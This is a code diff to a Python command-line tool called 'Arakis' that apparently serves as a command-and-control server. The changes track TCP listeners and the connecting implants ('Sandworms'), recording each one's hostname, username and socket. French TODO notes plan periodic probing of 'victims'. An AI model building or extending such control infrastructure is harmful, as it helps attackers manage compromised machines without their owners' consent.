@@ -17,7 +17,7 @@ class ArakisCLI(cmd.Cmd):
         super().__init__()
         self.log = logger.Logger(verbosity=verbosity)
         
-        self.tcp_listeners = {} # Indexed by ID, values are TCPServer instances
+        self.tcp_listeners = {} # Indexed by ID, values are a tuple (TCPServer, ID)
         self.tcp_listeners_count = 0
 
         self.http_servers = {} # Indexed by ID, values are HTTPServer instances
@@ -29,7 +29,8 @@ class ArakisCLI(cmd.Cmd):
 
         self.log.info(f"Verbosity level set to: {verbosity}")
 
-
+    # On override le emptyline pour que quand on rentre "enter" sans aucune commande
+    # ca exécute automatiquement la dernière commande lancée
     def emptyline(self):
         """Override emptyline to prevent repeating the last command."""
         pass
@@ -93,9 +94,10 @@ class ArakisCLI(cmd.Cmd):
         """
         try:
             interface, port = ip, int(port)
-            listener = TCPServer(interface, port, self.on_new_sandworm)
-
             index = self.tcp_listeners_count
+            listener = TCPServer(interface, port, index, self.on_new_sandworm)
+
+            
             self.tcp_listeners[index] = (listener,index)
             self.tcp_listeners_count+=1
             
@@ -246,18 +248,18 @@ class ArakisCLI(cmd.Cmd):
 
     
     ### CALLBACK FUNCTION FOR NEW SANDWORM ###
-    def on_new_sandworm(self, index, hostname, username, client_socket):
+    def on_new_sandworm(self, index, hostname, username, client_socket, tcp_listener_index):
         """
         This function is called when a new Sandworm connects.
         """
         
         print("\n" + Fore.GREEN + f"[+] New Sandworm connected {username}@{hostname}!" + Style.RESET_ALL)
-        print("(Arakis)> ", end='')
 
         self.sandworms[index] = {
             "socket": client_socket,
             "hostname": hostname,
-            "username": username
+            "username": username,
+            "tcp_index": tcp_listener_index
         }
 
     
@@ -310,7 +312,12 @@ class ArakisCLI(cmd.Cmd):
 
 Ajouter un attribut aux sandworm pour dire le dernier moment qu'ils était actif
     - Avoir une fonction qui probe périodiquement les victimes et ajuste l'attribut
-    - Imprimer les sandworm inactifs depuis plus de 2min en rouge quand tu les listes
+        - La fonction handle_client dans tcp_server ?
+    (Pas prioritaire du tout) - Imprimer les sandworm inactifs depuis plus de 2min en rouge quand tu les listes
+
+    
+Penser à peut-être modifier la structure du fichier tcp_server
+    - Peut-être que ca serait mieux de mettre les fonction clientes dans un autre fichier
 
 
 Faire une option pour lister les serveurs
